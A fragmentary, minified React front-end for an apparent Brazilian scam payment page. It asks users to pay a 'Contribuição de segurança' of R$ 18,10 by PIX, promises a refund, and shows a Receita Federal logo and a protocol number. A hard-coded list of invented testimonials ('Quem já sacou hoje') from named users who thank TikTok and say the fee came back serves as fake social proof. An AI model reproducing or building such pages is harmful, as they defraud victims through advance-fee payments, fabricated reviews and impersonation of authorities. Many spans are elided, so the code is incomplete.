...
// 🔧 Correção: Hook renomeado corretamente
const useTimer = i => {
...
// 🔧 Correção: Forçando String para evitar falha em conversão
const se = i => {
...
const xe = () => {
    ...
    return e.jsxs("div", {
        ...
        children: [e.jsxs("header", {
            ...
            children: [e.jsx(F, {
                size: 24,
                className: "text-[#E0E0E0] cursor-pointer active:scale-90 transition-transform",
                onClick: h
            }), e.jsx("h1", {
                className: "font-bold text-[17px] text-[#E0E0E0]",
            ...
            children: [e.jsx(C, {
                ...
                className: "text-[14px] font-bold text-[#C0C0C0]",
            ...
            children: e.jsxs("p", {
                className: "text-[#888888] text-[10px]",
                children: ["Protocolo: ", e.jsx("span", { className: "font-mono font-semibold text-[#A0A0A0]", children: b })]
            })
        }), e.jsxs("div", {
            ...
            children: [e.jsxs("div", {
                ...
                children: [e.jsx("p", {
                    className: "text-[#A0A0A0] text-[14px]",
                    ...
                    width: 90,
                    height: 90,
                    className: "absolute right-4 top-3 w-[90px] h-[90px]",
                ...
                children: [e.jsx("div", {
                    className: "absolute left-0 top-1/2 -translate-y-1/2 -translate-x-1/2 w-[20px] h-[20px] rounded-full bg-black border-r border-[#333333]"
                }), e.jsx("div", {
                    className: "absolute right-0 top-1/2 -translate-y-1/2 translate-x-1/2 w-[20px] h-[20px] rounded-full bg-black border-l border-[#333333]"
                }), e.jsx("div", {
                    className: "border-t-[2px] border-dashed border-[#444444] mx-5"
                })]
            }), e.jsxs("div", {
                className: "bg-[#1A1A1A] rounded-b-[16px] px-5 py-3 flex items-center justify-between border border-[#333333] border-t-0",
                children: [e.jsx("span", {
                    className: "text-[#A0A0A0] text-[13px]",
                    children: "Suas transações: R$ 0,03"
                }), e.jsx(F, {
                    size: 18,
                    className: "text-[#A0A0A0] rotate-180"
                })]
            })]
        }), e.jsxs("div", {
            ...
            children: [e.jsx("p", {
                className: "text-[#A0A0A0] text-[12px] uppercase tracking-wide font-bold mb-3",
                children: "Contribuição de segurança"
            }), e.jsxs("div", {
                ...
                className: "text-[#A0A0A0] text-[14px] leading-relaxed",
                ...
                children: [e.jsx("p", {
                    className: "text-[#888888] text-[10px] uppercase tracking-wider font-bold mb-1",
                    ...
                    children: [e.jsx("span", {
                        ...
                        className: "text-[#E0E0E0] text-[12px] font-semibold",
                        children: "R$ 18,10"
                    })]
                }), e.jsxs("div", {
                    className: "flex items-center justify-between",
                    ...
                    className: "border-t border-[#333333] pt-1.5 flex items-center justify-between",
                    children: [e.jsx("span", {
                        className: "text-[#E0E0E0] text-[12px] font-bold",
            ...
            children: e.jsxs("div", {
                ...
                children: [e.jsxs("div", {
                    ...
                    children: [e.jsx("div", {
                        className: "w-[32px] h-[32px] rounded-full bg-[#C0C0C0] flex items-center justify-center",
                        children: e.jsx("span", {
                            className: "text-black text-[11px] font-bold",
                            children: "1"
                        })
                    }), e.jsxs("p", {
                        className: "text-[#E0E0E0] text-[10px] font-bold mt-1.5 text-center leading-tight",
                        children: ["Pagar", e.jsx("br", {}), n(p)]
                    })]
                }), e.jsx("div", {
                    className: "h-[2px] bg-[#333333] flex-1 mx-1 mt-[-16px]"
                }), e.jsxs("div", {
                    className: "flex flex-col items-center flex-1",
                    children: [e.jsx("div", {
                        className: "w-[32px] h-[32px] rounded-full bg-[#2A2A2A] border border-[#3A3A3A] flex items-center justify-center",
                        children: e.jsx("span", {
                            className: "text-[#888888] text-[11px] font-bold",
                            children: "2"
                        })
                    }), e.jsxs("p", {
                        className: "text-[#888888] text-[10px] mt-1.5 text-center leading-tight",
            ...
            children: [e.jsx("p", {
                className: "text-[#888888] text-[12px] uppercase tracking-wide font-bold mb-4",
                children: "Dados para reembolso"
            }), e.jsxs("div", {
                className: "flex items-center justify-between py-3 border-b border-[#222222]",
                children: [e.jsx("span", {
                    className: "text-[#888888] text-[15px]",
                    children: "Data"
                }), e.jsx("span", {
                    className: "font-semibold text-[15px] text-[#E0E0E0]",
                    children: q
                })]
            }), e.jsxs("div", {
                className: "flex items-center justify-between py-3 border-b border-[#222222]",
                ...
                children: [e.jsx("span", {
                    ...
                    className: "font-bold text-[15px] text-[#E0E0E0]",
                    children: n(m)
                })]
            }), e.jsx("button", {
                className: "w-full h-[48px] bg-[#222222] text-[#E0E0E0] border border-[#333333] font-semibold text-[15px] rounded-[10px] mt-4",
                children: x
            })]
        }), e.jsx("div", {
            className: "mx-4 my-4 border-t border-[#222222]"
        }), o && e.jsxs("div", {
            ref: S,
            className: "mx-4 mb-4 bg-[#111111] rounded-[16px] border border-[#222222] p-5 transition-all duration-500 ease-out",
            children: [e.jsx("div", {
                ...
                children: e.jsx("img", {
                    ...
                    width: 28,
                    height: 28,
                    className: "h-[28px] object-contain invert opacity-80"
                })
            }), e.jsx("p", {
                className: "text-[#888888] text-[12px] uppercase tracking-wide font-bold mb-4 text-center",
                children: "Pague com PIX"
            }), o.qr_code_base64 ? e.jsx("div", {
                className: "flex justify-center mb-4",
                children: e.jsx("img", {
                    src: o.qr_code_base64,
                    alt: "QR Code PIX",
                    className: "w-[200px] h-[200px] rounded-[12px] border border-[#333333] p-2 bg-white"
                })
            }) : o.qr_code ? e.jsx("div", {
                className: "flex justify-center mb-4",
                children: e.jsx("img", {
                    src: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(o.qr_code)}`,
                    alt: "QR Code PIX",
                    className: "w-[200px] h-[200px] rounded-[12px] border border-[#333333] p-2 bg-white"
                })
            }) : null, e.jsx("p", {
                className: "text-[#888888] text-[12px] text-center mb-3",
                children: "Ou copie o código PIX abaixo:"
            }), o?.amount && e.jsx("div", {
                className: "text-center font-extrabold text-[18px] text-[#C0C0C0] mb-3",
                children: "Valor: R$ " + (o.amount / 100).toFixed(2).replace(".", ",")
            }), e.jsx("div", {
                className: "relative",
                children: e.jsx("div", {
                    className: "w-full bg-[#1A1A1A] border border-[#2A2A2A] rounded-[10px] p-3 text-[12px] text-[#E0E0E0] break-all leading-relaxed max-h-[80px] overflow-y-auto",
                    children: o.qr_code
                })
            }), e.jsxs("button", {
                onClick: L,
                className: "w-full h-[48px] bg-[#C0C0C0] text-black font-bold text-[15px] rounded-[12px] mt-3 flex items-center justify-center gap-2 active:scale-[0.98] transition-all",
                children: [v ? e.jsx(Y, {
                    size: 18
                }) : e.jsx(I, {
                    size: 18
                }), v ? "Código copiado!" : "Copiar código PIX"]
            }), y && e.jsxs("p", {
                className: "text-[#C0C0C0] text-[13px] text-center mt-3 font-bold",
                style: { fontVariantNumeric: "tabular-nums" },
            ...
            children: [e.jsx("p", {
                className: "text-[#888888] text-[11px] uppercase tracking-wider font-bold text-center mb-1",
                children: "Quem já sacou hoje"
            }), [{
                img: K, name: "Lucas M.", city: "São Paulo", value: "R$ 2.800", time: "há 12 min",
                text: "paguei achando q era cilada kkk mas o reembolso veio antes do saque, nunca mais duvido"
            }, {
                img: U, name: "Amanda S.", city: "Rio de Janeiro", value: "R$ 1.450", time: "há 28 min",
                text: "gente eu tava morrendo de medo mas fiz e caiu certinho, obrigada tiktok por essa oportunidade serio"
            }, {
                img: Q, name: "Rafael O.", city: "Belo Horizonte", value: "R$ 3.200", time: "há 43 min",
                text: "terceira vez sacando ja, toda vez cai em menos de 2 min, nao tem erro nenhum"
            }, {
                img: W, name: "Carla F.", city: "Curitiba", value: "R$ 980", time: "há 1h",
                text: "quase nao fiz por causa da taxa mas devolveram tao rapido q nem deu tempo de me arrepender kkk"
            }].map( (t, f) => e.jsxs("div", {
                className: "flex gap-3 items-start py-2 border-b border-[#222222] last:border-0",
                children: [e.jsx("img", {
                    src: t.img,
                    alt: t.name,
                    className: "w-[40px] h-[40px] rounded-full object-cover shrink-0 opacity-80"
                }), e.jsxs("div", {
                    className: "flex-1 min-w-0",
                    children: [e.jsxs("div", {
                        className: "flex items-center justify-between",
                        children: [e.jsx("span", {
                            className: "text-[#E0E0E0] text-[13px] font-semibold",
                            children: t.name
                        }), e.jsxs("span", {
                        ...
                        className: "text-[#A0A0A0] text-[12px] italic leading-snug mt-0.5",
                        children: ['"', t.text, '"']
                    }), e.jsxs("p", {
                        className: "text-[#666666] text-[10px] mt-0.5",
                ...
                children: [e.jsx("div", {
                    ...
                    children: [Z, H, G, ee].map( (t, f) => e.jsx("img", {
                        ...
                        alt: "",
                        loading: "lazy",
                        className: "w-[22px] h-[22px] rounded-full object-cover border-2 border-[#111111] opacity-80",
                        style: { imageRendering: "pixelated" }
                    }, f))
                }), e.jsx("span", {
                    className: "text-[#888888] text-[11px] ml-1",
            ...
            children: o ? e.jsxs("div", {
                ...
                children: [e.jsx(k, {
                    size: 16,
                    className: "animate-spin text-[#C0C0C0]"
                }), e.jsx("span", {
                    className: "text-[#888888] text-[14px] font-medium",
                ...
                children: [e.jsx("button", {
                    onClick: z,
                    disabled: N || !P,
                    className: "w-full h-[56px] bg-[#C0C0C0] text-black font-bold text-[16px] rounded-[14px] flex items-center justify-center gap-2 active:scale-[0.98] transition-all duration-150 shadow-[0_4px_14px_rgba(192,192,192,0.15)] disabled:opacity-50",
                    children: N ? e.jsx(k, {
                        size: 22,
            ...
            children: [e.jsx("img", {
                ...
                width: 28,
                height: 28,
                className: "h-[28px] object-contain invert opacity-60"
            }), e.jsx("img", {
                src: V,
                alt: "Receita Federal",
                loading: "lazy",
                width: 50,
                height: 50,
                className: "h-[50px] object-contain invert opacity-60"
            })]
        }), e.jsxs("div", {
            ...
            children: [e.jsx("p", {
                ...
                className: "text-[#666666] text-[9px] text-center mt-1",
                children: ["Protocolo ", b]
            }), e.jsx("p", {
                className: "text-[#C0C0C0] text-[13px] text-center font-semibold mt-1 cursor-pointer",
                onClick: () => i("/faq"),
